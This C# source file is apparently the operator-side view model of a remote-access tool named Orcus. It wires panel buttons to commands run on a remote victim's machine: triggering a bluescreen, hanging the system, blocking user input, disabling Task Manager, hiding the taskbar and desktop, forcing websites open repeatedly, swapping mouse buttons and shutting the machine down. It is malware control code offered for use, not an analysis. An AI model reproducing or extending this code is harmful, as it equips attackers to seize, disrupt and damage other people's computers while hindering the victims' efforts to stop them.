using System;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.Fun;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.FunActions;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    public class FunViewModel : CommandView
    {
        private RelayCommand _blockUserInputCommand;
        private RelayCommand _changeDesktopWallpaperCommand;
        private RelayCommand _changeKeyboardLayoutCommand;
        private RelayCommand _closeCdDriveCommand;
        private RelayCommand _disableTaskmanagerCommand;
        private RelayCommand _enableTaskmanagerCommand;
        private RelayCommand _hangSystemCommand;
        private RelayCommand _hideClockCommand;
        private RelayCommand _hideDesktopCommand;
        private RelayCommand _hideTaskbarCommand;
        private RelayCommand _holdMouseCommand;
        private RelayCommand _letItBurnCommand;
        private RelayCommand _mouseRestoreButtonsCommand;
        private RelayCommand _mouseSwapButtonsCommand;
        private RelayCommand _openCdDriveCommand;
        private RelayCommand _openWebsiteCommand;
        private RelayCommand _rotateScreenCommand;
        private RelayCommand _showClockCommand;
        private RelayCommand _showDesktopCommand;
        private RelayCommand _showTaskbarCommand;
        private RelayCommand _shutdownCommand;
        private RelayCommand _triggerBluescreenCommand;
        private RelayCommand _turnMonitorOffCommand;
        private RelayCommand _waterCommand;

        public override Category Category => Category.Fun;
        public override string Name => (string) Application.Current.Resources["Common"];
        public bool IsAdministrator { get; private set; }
        public bool IsServiceRunning { get; private set; }
        public FunCommand FunCommand { get; private set; }

        public RelayCommand ShowTaskbarCommand
        {
            get
            {
                return _showTaskbarCommand ??
                       (_showTaskbarCommand = new RelayCommand(parameter => { FunCommand.ShowTaskbar(); }));
            }
        }

        public RelayCommand HideTaskbarCommand
        {
            get
            {
                return _hideTaskbarCommand ??
                       (_hideTaskbarCommand = new RelayCommand(parameter => { FunCommand.HideTaskbar(); }));
            }
        }

        public RelayCommand HoldMouseCommand
        {
            get
            {
                return _holdMouseCommand ?? (_holdMouseCommand = new RelayCommand(parameter =>
                {
                    var seconds = int.Parse(parameter.ToString());
                    if (seconds < 1)
                        return;

                    FunCommand.HoldMouse(seconds);
                }));
            }
        }

        public RelayCommand TurnMonitorOffCommand
        {
            get
            {
                return _turnMonitorOffCommand ??
                       (_turnMonitorOffCommand = new RelayCommand(parameter => { FunCommand.DisableMonitor(); }));
            }
        }

        public RelayCommand TriggerBluescreenCommand
        {
            get
            {
                return _triggerBluescreenCommand ?? (_triggerBluescreenCommand = new RelayCommand(parameter =>
                {
                    if (!IsAdministrator && !IsServiceRunning)
                        if (
                            WindowService.ShowMessageBox((string) Application.Current.Resources["WarningUacWillPrompt"],
                                (string) Application.Current.Resources["Warning"], MessageBoxButton.YesNo,
                                MessageBoxImage.Warning, MessageBoxResult.No) == MessageBoxResult.No)
                            return;

                    if (
                        WindowService.ShowMessageBox((string) Application.Current.Resources["SureTriggerBluescreen"],
                            (string) Application.Current.Resources["Warning"], MessageBoxButton.OKCancel,
                            MessageBoxImage.Warning) == MessageBoxResult.OK)
                        FunCommand.TriggerBluescreen();
                }));
            }
        }

        public RelayCommand ShutdownCommand
        {
            get
            {
                return _shutdownCommand ?? (_shutdownCommand = new RelayCommand(parameter =>
                {
                    switch ((int) parameter)
                    {
                        case 0:
                            FunCommand.Shutdown();
                            break;
                        case 1:
                            FunCommand.LogOff();
                            break;
                        case 2:
                            FunCommand.Restart();
                            break;
                    }
                }));
            }
        }

        public RelayCommand RotateScreenCommand
        {
            get
            {
                return _rotateScreenCommand ??
                       (_rotateScreenCommand =
                           new RelayCommand(parameter => { FunCommand.RotateScreen((RotateDegrees) (int) parameter); }));
            }
        }

        public RelayCommand LetItBurnCommand
        {
            get
            {
                return _letItBurnCommand ??
                       (_letItBurnCommand = new RelayCommand(parameter => { FunCommand.PureEvilness(); }));
            }
        }

        public RelayCommand WaterCommand
        {
            get
            {
                return _waterCommand ??
                       (_waterCommand = new RelayCommand(parameter => { FunCommand.StopPureEvilness(); }));
            }
        }

        public RelayCommand ChangeKeyboardLayoutCommand
        {
            get
            {
                return _changeKeyboardLayoutCommand ??
                       (_changeKeyboardLayoutCommand =
                           new RelayCommand(parameter => { FunCommand.ChangeKeyboardLayout((byte) (int) parameter); }));
            }
        }

        public RelayCommand OpenWebsiteCommand
        {
            get
            {
                return _openWebsiteCommand ?? (_openWebsiteCommand = new RelayCommand(parameter =>
                {
                    var values = (object[]) parameter;
                    var url = (string) values[0];
                    var times = (int) (double) values[1];

                    Uri outUri;

                    if (!Uri.TryCreate(url, UriKind.Absolute, out outUri) ||
                        (outUri.Scheme != Uri.UriSchemeHttp && outUri.Scheme != Uri.UriSchemeHttps))
                    {
                        if (
                            WindowService.ShowMessageBox((string) Application.Current.Resources["WarningUrlNotValid"],
                                (string) Application.Current.Resources["Warning"], MessageBoxButton.YesNo,
                                MessageBoxImage.Warning, MessageBoxResult.No) == MessageBoxResult.No)
                            return;
                    }

                    FunCommand.OpenWebsite(url, times);
                }));
            }
        }

        public RelayCommand HideDesktopCommand
        {
            get
            {
                return _hideDesktopCommand ??
                       (_hideDesktopCommand = new RelayCommand(parameter => { FunCommand.HideDesktop(); }));
            }
        }

        public RelayCommand ShowDesktopCommand
        {
            get
            {
                return _showDesktopCommand ??
                       (_showDesktopCommand = new RelayCommand(parameter => { FunCommand.ShowDesktop(); }));
            }
        }

        public RelayCommand HideClockCommand
        {
            get
            {
                return _hideClockCommand ??
                       (_hideClockCommand = new RelayCommand(parameter => { FunCommand.HideClock(); }));
            }
        }

        public RelayCommand ShowClockCommand
        {
            get
            {
                return _showClockCommand ??
                       (_showClockCommand = new RelayCommand(parameter => { FunCommand.ShowClock(); }));
            }
        }

        public RelayCommand DisableTaskmanagerCommand
        {
            get
            {
                return _disableTaskmanagerCommand ??
                       (_disableTaskmanagerCommand = new RelayCommand(parameter => { FunCommand.DisableTaskmanager(); }));
            }
        }

        public RelayCommand EnableTaskmanagerCommand
        {
            get
            {
                return _enableTaskmanagerCommand ??
                       (_enableTaskmanagerCommand = new RelayCommand(parameter => { FunCommand.EnableTaskmanager(); }));
            }
        }

        public RelayCommand MouseSwapButtonsCommand
        {
            get
            {
                return _mouseSwapButtonsCommand ??
                       (_mouseSwapButtonsCommand = new RelayCommand(parameter => { FunCommand.SwapMouseButtons(); }));
            }
        }

        public RelayCommand MouseRestoreButtonsCommand
        {
            get
            {
                return _mouseRestoreButtonsCommand ??
                       (_mouseRestoreButtonsCommand =
                           new RelayCommand(parameter => { FunCommand.RestoreMouseButtons(); }));
            }
        }

        public RelayCommand OpenCdDriveCommand
        {
            get
            {
                return _openCdDriveCommand ?? (_openCdDriveCommand = new RelayCommand(parameter =>
                {
                    if (ClientController.Client.Version < 12)
                    {
                        WindowService.ShowMessageBox((string) Application.Current.Resources["ClientUpdateRequired"]); //version12disable
                        return;
                    }
                    FunCommand.OpenCdDrive();
                }));
            }
        }

        public RelayCommand CloseCdDriveCommand
        {
            get
            {
                return _closeCdDriveCommand ?? (_closeCdDriveCommand = new RelayCommand(parameter =>
                {
                    if (ClientController.Client.Version < 12)
                    {
                        WindowService.ShowMessageBox((string) Application.Current.Resources["ClientUpdateRequired"]); //version12disable
                        return;
                    }
                    FunCommand.CloseCdDrive();
                }));
            }
        }

        public RelayCommand BlockUserInputCommand
        {
            get
            {
                return _blockUserInputCommand ?? (_blockUserInputCommand = new RelayCommand(parameter =>
                {
                    var duration = (int) (double) parameter;
                    FunCommand.BlockUserInput(duration);
                }));
            }
        }

        public RelayCommand ChangeDesktopWallpaperCommand
        {
            get
            {
                return _changeDesktopWallpaperCommand ?? (_changeDesktopWallpaperCommand = new RelayCommand(parameter =>
                {
                    var parameters = (object[]) parameter;
                    var url = (string) parameters[0];
                    Uri outUri;

                    if (!Uri.TryCreate(url, UriKind.Absolute, out outUri) ||
                        (outUri.Scheme != Uri.UriSchemeHttp && outUri.Scheme != Uri.UriSchemeHttps))
                    {
                        if (
                            WindowService.ShowMessageBox((string) Application.Current.Resources["WarningUrlNotValid"],
                                (string) Application.Current.Resources["Warning"], MessageBoxButton.YesNo,
                                MessageBoxImage.Warning, MessageBoxResult.No) == MessageBoxResult.No)
                            return;
                    }
                    FunCommand.ChangeWallpaper(url, (DesktopWallpaperStyle) (int) parameters[1]);
                }));
            }
        }

        public RelayCommand HangSystemCommand
        {
            get
            {
                return _hangSystemCommand ??
                       (_hangSystemCommand = new RelayCommand(parameter => { FunCommand.HangSystem(); }));
            }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            FunCommand = clientController.Commander.GetCommand<FunCommand>();
            IsAdministrator = clientController.Client.IsAdministrator;
            IsServiceRunning = clientController.Client.IsServiceRunning;
        }

        protected override ImageSource GetIconImageSource()
        {
            return
                new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/ManualTest.ico",
                    UriKind.Absolute));
        }
    }
}